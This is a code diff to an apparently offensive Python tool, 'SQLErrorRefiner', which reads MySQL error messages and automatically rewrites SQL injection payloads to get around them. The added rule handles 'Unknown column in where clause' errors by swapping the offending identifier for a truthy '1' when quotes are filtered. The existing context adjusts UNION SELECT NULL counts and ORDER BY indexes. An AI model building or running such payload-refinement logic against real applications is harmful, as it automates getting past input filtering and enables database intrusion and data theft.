@@ -20,6 +20,11 @@ class SQLErrorRefiner:
                 "strategy": "Increase or decrease the number of NULLs in the UNION SELECT statement."
             },
             {
+                "pattern": r"Unknown column '([^']*)' in 'where clause'", # MySQL Error 1054
+                "fix_type": "UNKNOWN_COLUMN_WHERE",
+                "strategy": "The identifier was interpreted as a column name because it lacked quotes. Replace it with a numeric equivalent or hex string."
+            },
+            {
                 "pattern": r"Unknown column '([^']*)' in 'order clause'", # MySQL Error 1054
                 "fix_type": "ORDER_BY_ERROR",
                 "strategy": "The column index is too high. Reduce the number in ORDER BY."
@@ -73,4 +78,9 @@ class SQLErrorRefiner:
                 if len(parts) >= 3:
                     return f"{parts[0]}{parts[1]}{parts[2]},NULL"
                     
+        elif fix_type == "UNKNOWN_COLUMN_WHERE" and problem_token:
+            # The database parsed a string like 'admin' as a column because quotes were stripped.
+            # To fix the SQL syntax statically when quotes are banned, we replace the specific offending "column" with a truthy number.
+            return re.sub(rf'\b{re.escape(problem_token)}\b', "1", payload, flags=re.IGNORECASE)
+            
         return payload # Default: no change, let the AST handle it
